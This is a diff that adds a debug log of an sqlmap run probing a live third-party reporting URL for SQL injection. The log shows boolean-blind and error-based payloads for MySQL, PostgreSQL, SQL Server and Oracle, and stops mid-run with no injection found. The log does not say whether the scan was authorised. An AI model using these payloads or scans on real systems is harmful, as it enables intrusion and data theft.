@@ -1,0 +1,1678 @@
+        ___
+
+       __H__
+
+ ___ ___["]_____ ___ ___  {1.8.3.12#dev}
+
+|_ -| . [']     | .'| . |
+
+|___|_  ["]_|_|_|__,|  _|
+
+      |_|V...       |_|   https://sqlmap.org
+
+
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+
+
+[*] starting @ 16:23:46 /2024-04-08/
+
+
+
+[16:23:46] [DEBUG] cleaning up configuration parameters
+
+[16:23:47] [DEBUG] setting the HTTP timeout
+
+[16:23:47] [DEBUG] setting the HTTP User-Agent header
+
+[16:23:47] [DEBUG] creating HTTP requests opener object
+
+[16:23:47] [DEBUG] initializing the knowledge base
+
+[1/1] URL:
+
+GET https://cube.weixinbridge.com/cube/report/reportbizdata?f=json&report_items=%5B%7B%22biz_id%22:1212,%22time%22:1712564515,%22type%22:1000,%22code%22:0,%22apiname%22:%22PCMsgChannel%22,%22message%22:%22onPCMsgChannel:ok%22,%22cost%22:174%7D%5D
+
+do you want to test this URL? [Y/n/q]
+
+> Y
+
+[16:23:47] [DEBUG] used the default behavior, running in batch mode
+
+[16:23:47] [INFO] testing URL 'https://cube.weixinbridge.com/cube/report/reportbizdata?f=json&report_items=%5B%7B%22biz_id%22:1212,%22time%22:1712564515,%22type%22:1000,%22code%22:0,%22apiname%22:%22PCMsgChannel%22,%22message%22:%22onPCMsgChannel:ok%22,%22cost%22:174%7D%5D'
+
+it appears that provided value for GET parameter 'report_items' is JSON deserializable. Do you want to inject inside? [y/N] N
+
+[16:23:47] [DEBUG] used the default behavior, running in batch mode
+
+[16:23:47] [INFO] using 'C:\Users\LYZ\AppData\Local\sqlmap\output\results-04082024_0423pm.csv' as the CSV results file in multiple targets mode
+
+[16:23:47] [DEBUG] resolving hostname 'cube.weixinbridge.com'
+
+[16:23:47] [INFO] testing connection to the target URL
+
+[16:23:47] [INFO] testing if the target URL content is stable
+
+[16:23:47] [INFO] target URL content is stable
+
+[16:23:47] [INFO] testing if GET parameter 'f' is dynamic
+
+[16:23:47] [PAYLOAD] 1724
+
+[16:23:47] [WARNING] GET parameter 'f' does not appear to be dynamic
+
+[16:23:47] [PAYLOAD] json".),.('),.
+
+[16:23:47] [WARNING] heuristic (basic) test shows that GET parameter 'f' might not be injectable
+
+[16:23:47] [PAYLOAD] json'YXoBRl<'">EMJBnh
+
+[16:23:47] [INFO] testing for SQL injection on GET parameter 'f'
+
+[16:23:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+
+[16:23:47] [PAYLOAD] json') AND 6595=2378 AND ('MBlm'='MBlm
+
+[16:23:47] [PAYLOAD] json' AND 8587=4530 AND 'OhPo'='OhPo
+
+[16:23:47] [PAYLOAD] json) AND 3631=8836 AND (4771=4771
+
+[16:23:47] [PAYLOAD] json AND 2446=5911
+
+[16:23:48] [PAYLOAD] json AND 9884=8872-- NKfp
+
+[16:23:48] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+
+[16:23:48] [PAYLOAD] (SELECT (CASE WHEN (1278=2389) THEN 'json' ELSE (SELECT 2389 UNION SELECT 2966) END))
+
+[16:23:48] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause (original value)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+
+[16:23:48] [PAYLOAD] json') AND EXTRACTVALUE(2162,CONCAT(0x5c,0x7178767871,(SELECT (ELT(2162=2162,1))),0x7170767071)) AND ('RvAC'='RvAC
+
+[16:23:48] [PAYLOAD] json' AND EXTRACTVALUE(2162,CONCAT(0x5c,0x7178767871,(SELECT (ELT(2162=2162,1))),0x7170767071)) AND 'HQYX'='HQYX
+
+[16:23:48] [PAYLOAD] json) AND EXTRACTVALUE(2162,CONCAT(0x5c,0x7178767871,(SELECT (ELT(2162=2162,1))),0x7170767071)) AND (2561=2561
+
+[16:23:48] [PAYLOAD] json AND EXTRACTVALUE(2162,CONCAT(0x5c,0x7178767871,(SELECT (ELT(2162=2162,1))),0x7170767071))
+
+[16:23:48] [PAYLOAD] json AND EXTRACTVALUE(2162,CONCAT(0x5c,0x7178767871,(SELECT (ELT(2162=2162,1))),0x7170767071))-- RcdU
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+
+[16:23:48] [PAYLOAD] json') AND 6435=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6435=6435) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND ('vvCn'='vvCn
+
+[16:23:48] [PAYLOAD] json' AND 6435=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6435=6435) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND 'smid'='smid
+
+[16:23:48] [PAYLOAD] json) AND 6435=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6435=6435) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND (2893=2893
+
+[16:23:48] [PAYLOAD] json AND 6435=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6435=6435) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)
+
+[16:23:48] [PAYLOAD] json AND 6435=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6435=6435) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)-- OBxh
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+
+[16:23:48] [PAYLOAD] json') AND 5672 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5672=5672) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113))) AND ('bmGX'='bmGX
+
+[16:23:48] [PAYLOAD] json' AND 5672 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5672=5672) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113))) AND 'UlLo'='UlLo
+
+[16:23:48] [PAYLOAD] json) AND 5672 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5672=5672) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113))) AND (1902=1902
+
+[16:23:48] [PAYLOAD] json AND 5672 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5672=5672) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113)))
+
+[16:23:48] [PAYLOAD] json AND 5672 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5672=5672) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113)))-- blqL
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+
+[16:23:48] [PAYLOAD] json') AND 8357=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (8357=8357) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND ('JQHv'='JQHv
+
+[16:23:48] [PAYLOAD] json' AND 8357=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (8357=8357) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'WMYg'='WMYg
+
+[16:23:48] [PAYLOAD] json) AND 8357=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (8357=8357) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (5724=5724
+
+[16:23:48] [PAYLOAD] json AND 8357=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (8357=8357) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)
+
+[16:23:48] [PAYLOAD] json AND 8357=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (8357=8357) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)-- LUiE
+
+[16:23:48] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the risk (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)
+
